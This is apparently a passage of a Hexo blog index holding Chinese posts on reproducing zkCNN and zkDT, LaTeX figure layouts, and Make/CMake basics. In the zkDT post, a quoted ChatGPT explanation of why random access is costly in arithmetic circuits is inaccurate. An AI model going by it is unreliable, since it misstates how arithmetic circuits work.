type="1"><li><ahref="https://github.com/DavidAnson/markdownlint/blob/main/doc/Prettier.md?plain=1">markdownlint/Prettier.mdat main · DavidAnson/markdownlint</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zkCNN 论文阅读与复现</title>
      <link href="/blog/2022/05/20/academic/papers/zkcnn/"/>
      <url>/blog/2022/05/20/academic/papers/zkcnn/</url>
      
        <content type="html"><![CDATA[<h2 id="论文地址">论文地址</h2><p><ahref="https://dl.acm.org/doi/abs/10.1145/3460120.3485379">CCS21：zkCNN:Zero Knowledge Proofs for Convolutional Neural Network Predictions andAccuracy | Proceedings of the 2021 ACM SIGSAC Conference on Computer andCommunications Security</a></p><h2 id="论文概述">论文概述</h2><h2 id="代码复现">代码复现</h2><p>环境：Ubuntu 18.04 and 20.04</p><h3 id="zkcnn">zkCNN</h3><p><a href="https://github.com/TAMUCrypto/zkCNN">TAMUCrypto/zkCNN: AGKR-based zero-knowledge proof protocol for CNN model inference.</a>一般使用了 submodules的，使用<code>git clone --recurse-submodules 仓库地址</code>即可，但是本文仓库设置有点小问题。</p><ol type="1"><li><p>下载</p><p>由于该仓库使用了 submodule，但是其由于该仓库 .gitmodules 使用 SSH协议指定的仓库位置，但我们显然没有被授权过，因此没有权限下载submodules。解决办法：</p><ol type="1"><li><p>(推荐) 先 git clone 仓库，然后把 .gitmodules 的链接改成 HTTPS的，然后递归初始化并更新 submodules 推荐：递归初始化，并更新:<code>git submodule update --init --recursive</code></p><blockquote><p>不推荐：<code>git submodule update</code>只更新子项目代码，在一些旧版本没有初始化的 submodules 不会被更新</p></blockquote><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TAMUCrypto/zkCNN.git</span><br><span class="line">git submodule update --init --recursive</span><br></pre></td></tr></table></figure></p></li><li><p>(凑活) 只使用 git clone，直接找 submodules的仓库门，自行下载到指定的嵌套的 submodules 文件夹位置</p></li></ol></li><li><p>安装缺少的依赖</p><p>安装 GMP library</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libgmp3-dev</span><br></pre></td></tr></table></figure></p><p><code>cmake --version</code> 查看版本是否满足 cmake &gt;= 3.10，满足<code>gcc --version</code> 查看 gcc 版本是否支持 C++14</p><blockquote><p>according to GCC's Standards Support page--which shows full C++14support since GCC v5</p></blockquote></li><li><p>编译运行</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd scripts</span><br><span class="line">chmod +777 ./*</span><br><span class="line">./demo_lenet.sh</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="调试">调试</h3><p>CMake + VSCode 调试 配置 CMake 选择 zkCNN 主目录下的 CMakeLists.txt先 build 配置 CMake:build Target 为想要运行的可执行文件demo_lenet_run</p><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://stackoverflow.com/questions/10168449/git-update-submodules-recursively">Gitupdate submodules recursively - Stack Overflow</a></li><li><ahref="https://askubuntu.com/questions/207724/how-to-install-the-latest-gmp-library-in-12-04">softwareinstallation - How to install the latest gmp library in 12.04? - AskUbuntu</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
            <tag> zkp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZKDT 论文阅读与复现</title>
      <link href="/blog/2022/05/20/academic/papers/zkdt/"/>
      <url>/blog/2022/05/20/academic/papers/zkdt/</url>
      
        <content type="html"><![CDATA[<p>地址：<ahref="h0tps://dl.acm.org/doi/10.1145/3372297.3417278">CCS20：ZeroKnowledge Proofs for Decision Tree Predictions and Accuracy |Proceedings of the 2020 ACM SIGSAC Conference on Computer andCommunications Security</a></p><h1 id="zkdt">zkDT</h1><p>Zhang et al. 开创了 zkml的研究，专注于解决黑盒机器学习模型的准确度验证问题(验证阶段的证明)。zkDT可以实现：模型的验证者在不 reveal 自己的决策树模型的情况下，说服别人 theprediction result is indeed made by his decision tree model on the givethe input data sample. 通过扩展一个测试数据的证明到 100， 1000个测试数据，那样就可以实现对黑盒机器学习模型的验证问题了。</p><p>本文专注于 binary decision trees on classification,并声称更复杂的决策树模型可以通过少量修改来实现.</p><h2 id="zkdt-construction">zkDT construction</h2><p>recall 一下 zero knowledge proof system 的四个部分：Arithmetization,IOP interactive oracle proof, cryptographic commitment --&gt;areal-world proof system （a non-interactive proof with Fiat-Shamirtransformation）</p><p>zkDT 采用 <a href="https://eprint.iacr.org/2018/828.pdf">Aurora:Transparent Succinct Arguments for R1CS</a> 实现 Arithmetization, IOPinteractive oracle proof 两部分。Aurora 提出针对 R1CS 算术化进行优化的Polynomail IOP，实现更快的证明时间与更小的证明大小，并且不需要 trustedSetup。在 cryptographic commitment 方面，zkDT 通过设计 authenticateddecision trees with hiding and binding properties 作为 commitment scheme来将 idealized IOP protocol（with Random Oracle Model) compile 为真正的zero knowledge argument with computational soundness.</p><p>注：Preliminary 写的很好，可以借鉴</p><p>binary decision trees 的预测过程为：不断与非叶子节点的对应属性attribute 的分类阈值 threshold进行比较，从而分类到左右节点，直到叶子节点，便是预测的类别。</p><p>非叶子节点包括: 类别，类别对应的阈值</p><h2 id="zkdt-算法流程">zkDT 算法流程</h2><ol type="1"><li><p>Given security parameter <spanclass="math inline">\(1^{\lambda}\)</span>，Setup (Note: the height ofthe decision tree is a common knowledge for both prover andverifier)</p></li><li><p>make the commitment of a decision tree T with a random r</p></li><li><p>Open the commitment at point <spanclass="math inline">\(x\)</span>.</p><p>given a data point <span class="math inline">\(x1\)</span>， thedecision tree model predict the corresponding results <spanclass="math inline">\(y1\)</span>. With the (x1,y1) as public inputs andthe model parameter as witness, the prover will give the correspondingproof <span class="math inline">\(\pi\)</span>.</p></li><li><p>valid the prediction <span class="math inline">\(y1\)</span> isindeed the output of the exact decision model with the input <spanclass="math inline">\(x1\)</span>.</p></li></ol><p>Contributions:</p><ol start="0" type="1"><li>开创了 zk on ml 的研究,实现决策树验证阶段的验证以及准确度验证。</li><li>设计了 authenticated data structures scheme for the commitment ofdecision tree (with hiding property)</li><li>利用通用零知识证明系统 Aurora 实现决策树的预测阶段验证,将 predictionpath and the hashes of the siblings 作为 the witness.</li><li>借助 permutation 以及 characteristic polynomials 来解决 circuitmodel 下 zkp for decision tree随机访问开销大（证明时间，证明大小）的问题</li></ol><h2 id="authenticated-decision-trees-commitment">authenticated decisiontrees commitment</h2><p>本文提出直接运用 merkle tree proof 在所有决策树节点上，开销是O(hlogN) hashes。（不懂，merkle tree 不是 logN 吗？），于是根据ADS(Authenticated Data Structure)，提出 authenticated decision trees(ADT) ,它具有 completeness， computational soundness benefiting fromcollision resistance of the cryptographic hash functions, and hidingproperty benefiting the blinding factor(致盲因子，just a secure randomnumber).</p><p>题外话，Authenticated Data Structure 是一大类，merkle tree是其中一种。Past work on ADSs has focused on particular data structures,最早被提出的便是针对与树结构的 ADS， 也就是 merkle tree.</p><h2 id="proving-the-valid-of-prediction-with-zero-knowledge">proving thevalid of prediction with zero Knowledge</h2><p>prover 直接把 ADT 的 验证 path 给到 verifier，verifier就可以验证，但是这样就暴露了一条路径上的值。</p><p>解决办法：直接用通用的 zkp，将预测路径和 sibling 的 hashes 设置成witness （private）即可。</p><blockquote><p>By applying generic zero knowledge proofs on this relationship, theprediction path and the hashes of the siblings remain confidential asthe witness, a</p></blockquote><h2id="zkp-for-decision-tree-在-circuit-model-下开销大证明时间和证明大小">zkpfor decision tree 在 circuit model 下开销大（证明时间和证明大小）</h2><p>大多数通用 zkp协议都是基于将运算表示为算术电路的，将决策树表示为算术电路开销很大。(节点预测时，根据节点分类属性随机access 数据点的对应属性，是 classical random accessoperation，算数电路对这种操作不友好？不懂)</p><p>遇事不决 GPT:</p><blockquote><p>Classical random access operations are not friendly with arithmeticcircuits because they require the circuit to perform a large number ofmemory accesses, which can be computationally expensive . In anarithmetic circuit, each gate computes a linear combination of its inputwires, and the output of the circuit is a linear combination of theinput wires .</p><p>To perform a random access operation on an arithmetic circuit, onewould need to access a specific wire in the circuit, which would requiretraversing the circuit from the input wires to the desired wire . Thistraversal would involve performing a large number of linearcombinations, which can be computationally expensive To avoid thiscomputational overhead, researchers have developed alternative methodsfor performing random access operations on arithmetic circuits, such asthe use of permutation arguments and the use of interactive oracleproofs (IOPs)</p></blockquote><p>本文采用的 alternative methods 仿佛就是 the use of permutationarguments？将 data sample 的属性顺序 premute 调整为 prediction path上节点的属性 v.attr 顺序，二者顺序一致，便可一一对应，不用 random access操作了，便降低了 decision tree 在 circuit model 上的开销。</p><blockquote><p>the permutation <span class="math inline">\(\overline{a}\)</span> ofthe data sample a ordered by v.att of the nodes on the prediction pathas part of the witness With the help of the permutation <spanclass="math inline">\(\overline{a}\)</span> of the data sample a, thiscan be efficiently implemented using an arithmetic circuit.</p></blockquote><p>不过，又引入了 permutation test 的问题，毕竟胡乱 permutation混过验证也不得行,然后本文采用如下方法：</p><blockquote><p>The construction is inspired by the RAM-based zero knowledge proofsystems and we also apply the techniques of characteristic polynomialsproposed in [15, 43, 45] to check permutations.</p></blockquote><p>因此，zkDT 对一个数据点的验证包括三个部分:</p><ol type="1"><li>validating the prediction algorithm of the decision tree,这就是验证预测阶段的执行，是主要部分</li><li>checking the permutation between a and <spanclass="math inline">\(\overline{a}\)</span>，这个为了减小开销，引入的permutation 带来的额外验证步骤。</li><li>checking the validity of the prediction path in the committeddecision tree， 这个是 open 之前的 commitment 看 prediction path是否被篡改。</li></ol><p>步骤 1 和步骤 3 是 zkml 的主要步骤，步骤二是额外步骤。</p><h2 id="zkdt-代码复现">zkDT 代码复现</h2><p>环境：Ubuntu 18.04 and 20.04</p><p>地址：<ahref="https://github.com/TAMUCrypto/ZKDT_release">TAMUCrypto/ZKDT_release</a>，直接git clone 即可</p><ol type="1"><li><p>安装缺少的包：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y libprocps-dev # libprocps</span><br><span class="line">sudo apt-get install libssl-dev # libcrypto</span><br><span class="line">sudo apt-get install pkg-config</span><br></pre></td></tr></table></figure></p><p>针对报错：</p><blockquote><p>No Boost libraries were found. You may need to set BOOST_LIBRARYDIRto the directory containing Boost libraries or BOOST_ROOT to thelocation of Boost.</p></blockquote><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libboost-all-dev</span><br></pre></td></tr></table></figure></p></li><li><p>编译</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ZKDT</span><br><span class="line">mkdir build &amp;&amp; cd build &amp;&amp; cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p></li><li><p>运行</p><p>在 build 的 src 文件夹下直接运行编译生成的二进制文件即可。</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build/src/dt_batch</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="参考资料">参考资料</h2><ol type="1"><li><ahref="http://www.pl-enthusiast.net/2014/06/11/authenticated-data-structures-generically/">AuthenticatedData Structures (Generically) - The PL Enthusiast</a></li><li><ahref="https://stackoverflow.com/questions/24173330/cmake-is-not-able-to-find-boost-libraries">c++- CMake is not able to find BOOST libraries - Stack Overflow</a></li><li><a href="https://gcc.gnu.org/projects/cxx-status.html#cxx14">C++Standards Support in GCC - GNU Project</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
            <tag> zkp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Latex 多图表排版代码</title>
      <link href="/blog/2022/05/20/misc/latex/latex_graph/"/>
      <url>/blog/2022/05/20/misc/latex/latex_graph/</url>
      
        <content type="html"><![CDATA[<p>在 LaTeX 中插入多个空行的正确做法是：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\vspace</span>*&#123;n<span class="keyword">\baselineskip</span>&#125;</span><br></pre></td></tr></table></figure><p>其中 n 为想空的行数。</p><p>无序列表</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;itemize&#125;<span class="keyword">\compresslist</span></span><br><span class="line">    <span class="keyword">\item</span> ease of use when formatting,</span><br><span class="line">    <span class="keyword">\item</span>  compliance to electronic requirements,</span><br><span class="line">    <span class="keyword">\item</span> and conformity of style.</span><br><span class="line"><span class="keyword">\end</span>&#123;itemize&#125;</span><br></pre></td></tr></table></figure><p>三图横向并列跨栏独立标题</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure*&#125;</span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[t]&#123;0.34<span class="keyword">\linewidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=<span class="keyword">\textwidth</span>]&#123;pic/computation<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">        <span class="keyword">\caption</span>&#123;Jay&#125;</span><br><span class="line">        <span class="keyword">\label</span>&#123;fig:a<span class="built_in">_</span>computation<span class="built_in">_</span>cost&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[t]&#123;0.34<span class="keyword">\linewidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">        <span class="keyword">\caption</span>&#123;cost&#125;</span><br><span class="line">        <span class="keyword">\label</span>&#123;fig:b<span class="built_in">_</span>communication<span class="built_in">_</span>cost&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line">    <span class="keyword">\begin</span>&#123;minipage&#125;[t]&#123;0.34<span class="keyword">\linewidth</span>&#125;</span><br><span class="line">        <span class="keyword">\centering</span></span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=<span class="keyword">\textwidth</span>]&#123;pic/computation<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">        <span class="keyword">\caption</span>&#123;cost&#125;</span><br><span class="line">        <span class="keyword">\label</span>&#123;fig:c<span class="built_in">_</span>computation<span class="built_in">_</span>cost&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;minipage&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure><p>三图横向并列跨栏子标题</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;subfigure&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;figure*&#125;</span><br><span class="line">    <span class="keyword">\subfigure</span>[name1]&#123;</span><br><span class="line">        <span class="keyword">\centering</span>  <span class="comment">%图片全局居中</span></span><br><span class="line">        <span class="keyword">\label</span>&#123;Fig.sub.1&#125;</span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=0.32<span class="keyword">\textwidth</span>]&#123;pic/computation<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">\subfigure</span>[name2]&#123;</span><br><span class="line">        <span class="keyword">\centering</span>  <span class="comment">%图片全局居中</span></span><br><span class="line">        <span class="keyword">\label</span>&#123;Fig.sub.2&#125;</span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=0.33<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">\subfigure</span>[name3]&#123;</span><br><span class="line">        <span class="keyword">\centering</span>  <span class="comment">%图片全局居中</span></span><br><span class="line">        <span class="keyword">\label</span>&#123;Fig.sub.3&#125;</span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=0.33<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">\caption</span>&#123;Main name&#125;</span><br><span class="line">    <span class="keyword">\label</span>&#123;Fig.main&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure><p>无标题</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure*&#125;</span><br><span class="line">    <span class="keyword">\centering</span></span><br><span class="line">    <span class="keyword">\includegraphics</span>[width=0.32<span class="keyword">\textwidth</span>]&#123;pic/computation<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    <span class="keyword">\includegraphics</span>[width=0.33<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    <span class="keyword">\includegraphics</span>[width=0.33<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    <span class="keyword">\caption</span>&#123;This is a picture.&#125;</span><br><span class="line">    <span class="keyword">\label</span>&#123;fig:&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure><p>数组与表格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$$\begin&#123;array&#125;&#123;|l|l|&#125; % control positon left center right(l c r), &#x27;|&#x27; control border</span><br><span class="line">        \hline                                &amp; \text &#123;No Attack, Attacks&#125; \\</span><br><span class="line">        \hline \text &#123; Krum &#125;                 &amp; 0.14, 0.72, 0.13           \\</span><br><span class="line">        \hline \text &#123; Krum + ERR &#125;           &amp; 0.14, 0.62, 0.13           \\</span><br><span class="line">        \hline \text &#123; Krum + LFR &#125;           &amp; 0.14, 0.58, 0.14           \\</span><br><span class="line">        \hline \text &#123; Krum + Union &#125;         &amp; 0.14, 0.48, 0.14           \\</span><br><span class="line">        \hline \hline \text &#123; Trimmed mean &#125;  &amp; 0.12, 0.15, 0.23           \\</span><br><span class="line">        \hline \text &#123; Trimmed mean + ERR &#125;   &amp; 0.12, 0.17, 0.21           \\</span><br><span class="line">        \hline \text &#123; Trimmed mean + LFR &#125;   &amp; 0.12, 0.18, 0.12           \\</span><br><span class="line">        \hline \text &#123; Trimmed mean + Union &#125; &amp; 0.12, 0.18, 0.12           \\</span><br><span class="line">        \hline \hline \text &#123; Median &#125;        &amp; 0.13, 0.17, 0.19           \\</span><br><span class="line">        \hline \text &#123; Median + ERR &#125;         &amp; 0.13, 0.21, 0.25           \\</span><br><span class="line">        \hline \text &#123; Median + LFR &#125;         &amp; 0.13, 0.20, 0.13           \\</span><br><span class="line">        \hline \text &#123; Median + Union &#125;       &amp; 0.13, 0.19, 0.14           \\</span><br><span class="line">        \hline</span><br><span class="line">    \end&#123;array&#125;</span><br><span class="line">$$</span><br><span class="line">\begin&#123;center&#125;</span><br><span class="line">    Table 1: Defense, in Depth</span><br><span class="line">\end&#123;center&#125;</span><br><span class="line">``</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMake 和 Make 编译</title>
      <link href="/blog/2022/05/20/programming/c++/cmake_make/"/>
      <url>/blog/2022/05/20/programming/c++/cmake_make/</url>
      
        <content type="html"><![CDATA[<h2 id="make-与-makefile">Make 与 MakeFile</h2><p>makefile 文件使代码编译更加便捷高效, make 程序解析 makefile文件的指令，进行编译和链接程序。</p><p>makefile 优点：</p><ol type="1"><li><p>如果这个工程没有编译过，那么我们的所有 c文件都要编译并被链接。</p></li><li><p>如果这个工程的某几个 c 文件被修改，那么我们只编译被修改的 c文件，并链接目标程序。</p></li><li><p>如果这个工程的头文件被改变了，那么我们需要编译引用了这几个头文件的c 文件，并链接目标程序。</p></li><li><p>编译命令复杂，例如：<code>gcc -o hellomake hellomake.c hellofunc.c -I.</code></p><ol type="1"><li>节省重复编译时，重新输入编译命令所需的时间，尤其是要编译的源文件很多时。</li><li>如果编译命令丢失了，你就需要重新输入</li></ol></li></ol><p>MakeFile 的几个常用关键字段与知识：</p><ol type="1"><li><p>Makefile 文件名默认的情况下，make命令会在当前目录下按顺序找寻文件名为“GNUmakefile”、“makefile”、“Makefile”的文件，建议优先使用“Makefile”文件名。</p><p>也可用别的文件名来书写 Makefile，比如 CMake 生成的 Makefile 一般为xxx.make，注意：要指定非默认的 Makefile，使用 make 的“-f”和“--file”参数，一般如下：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make -f ./Makefile ./build</span><br><span class="line">make -f ./build.make ./build</span><br></pre></td></tr></table></figure></p></li><li><p>默认情况下，make 解析 Makefile 中第一个不以 <code>.</code> 开头的target 作为默认编译目标</p><p>例如：</p><p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.DEFAULT_GOAL := mytarget</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: default</span></span><br><span class="line"><span class="section">default: mytarget ;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="section">default_target: all</span></span><br><span class="line">.PHONY : default_target</span><br></pre></td></tr></table></figure></p></li></ol><p>对于一个 C/C++ 项目，一般有着与下面类似的目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── build</span><br><span class="line">│   ├── a.o</span><br><span class="line">│   ├── b.o</span><br><span class="line">│   └── ...</span><br><span class="line">├── include</span><br><span class="line">│   ├── a.h</span><br><span class="line">│   └── b.h</span><br><span class="line">├── depends</span><br><span class="line">│   ├── lib1</span><br><span class="line">│   ├── lib12</span><br><span class="line">│   └── ...</span><br><span class="line">├── src</span><br><span class="line">│   ├── a.c</span><br><span class="line">│   ├── b.c</span><br><span class="line">│   └── ...</span><br><span class="line">├── Makefile</span><br><span class="line">└── test</span><br></pre></td></tr></table></figure><p>其中，test 是最后生成的可执行二进制文件，include是头文件存放的目录，src 存放源文件，build 存放目标文件，depend存放依赖的库，按照惯例，我们一般会将 Makefile 放在项目的根目录下。</p><p>一般将所有生成的目标文件输出到 build目录下，这样目录就比较干净，当然也不乏将最后的二进制可执行文件生成在build 下的，具体看 MakeFile 如何指定。</p><h2 id="make">make</h2><p>make 常见用法三种：</p><ol type="1"><li><code>make</code> 寻找默认的 Makefile 进行编译，可通过<code>-f</code> 指定 MakeFile</li><li><code>make install</code> 是编译并安装</li><li><code>make clean</code> 用来清除所有的目标文件，以便重编译。</li></ol><p>linux 编译安装软件的流程如下，如果编译项目则不执行<code>make install</code> 安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>configure、make 和 make install 作用如下：</p><ol type="1"><li>./configure是用来检测你的安装平台的目标特征的。比如它会检测你是不是有 CC 或GCC，并不是需要 CC 或 GCC，它是个 shell 脚本。</li><li>make 是用来编译的，它从 Makefile 中读取指令，然后编译。</li><li>make install 是用来安装的（例如把 C++ 库编译安装到系统目录），它也从Makefile 中读取指令，安装到指定的位置。</li></ol><h2 id="cmake">CMake</h2><p>不同平台（linux、Windows、MacOS）的编译环境是有差异的，为了应对这种差异，各平台编译所需的MakeFile 文件也各不相同。而 cmake，作为一个一个跨平台的安装（编译）工具，它抽象了一套上层的编译配置语法，并负责了将Ta 针对平台进行 MakeFile 文件解释的任务。</p><p>CMake 定义了一套语法来组织 CMakeLists.txt 文件，然后通过 cmake命令可以结合 CMakeLists.txt 文件的”配置“生成 MakeFile，然后交给 make解析</p><h3 id="外部构建">外部构建</h3><p>CMake可以将将所有的编译信息有效地管理在一个文件夹下！当我们想清理编译数据时，只需要删除build 文件夹。其生成的 MakeFile 中的变量 CMAKE_BINARY_DIR 指向 cmake命令的根文件夹，所有二进制文件在这个文件夹里产生，一般可以在 CMake之后查看，确定二进制文件的位置。</p><p>外部构建常规步骤：创建 build 文件夹，然后进入该文件夹，通过为 cmake指定上层目录寻找 CMakeLists.txt, 将编译文件生成在该文件夹下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build/</span><br><span class="line">cmake ..</span><br></pre></td></tr></table></figure><p>一般文件树如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">├── build</span><br><span class="line">│   ├── CMakeCache.txt</span><br><span class="line">│   ├── CMakeFiles</span><br><span class="line">│   │   ├── 2.8.12.2</span><br><span class="line">│   │   │   ├── CMakeCCompiler.cmake</span><br><span class="line">│   │   │   ├── CMakeCXXCompiler.cmake</span><br><span class="line">│   │   │   ├── CMakeDetermineCompilerABI_C.bin</span><br><span class="line">│   │   │   ├── CMakeDetermineCompilerABI_CXX.bin</span><br><span class="line">│   │   │   ├── CMakeSystem.cmake</span><br><span class="line">│   │   │   ├── CompilerIdC</span><br><span class="line">│   │   │   │   ├── a.out</span><br><span class="line">│   │   │   │   └── CMakeCCompilerId.c</span><br><span class="line">│   │   │   └── CompilerIdCXX</span><br><span class="line">│   │   │       ├── a.out</span><br><span class="line">│   │   │       └── CMakeCXXCompilerId.cpp</span><br><span class="line">│   │   ├── cmake.check_cache</span><br><span class="line">│   │   ├── CMakeDirectoryInformation.cmake</span><br><span class="line">│   │   ├── CMakeOutput.log</span><br><span class="line">│   │   ├── CMakeTmp</span><br><span class="line">│   │   ├── hello_cmake.dir</span><br><span class="line">│   │   │   ├── 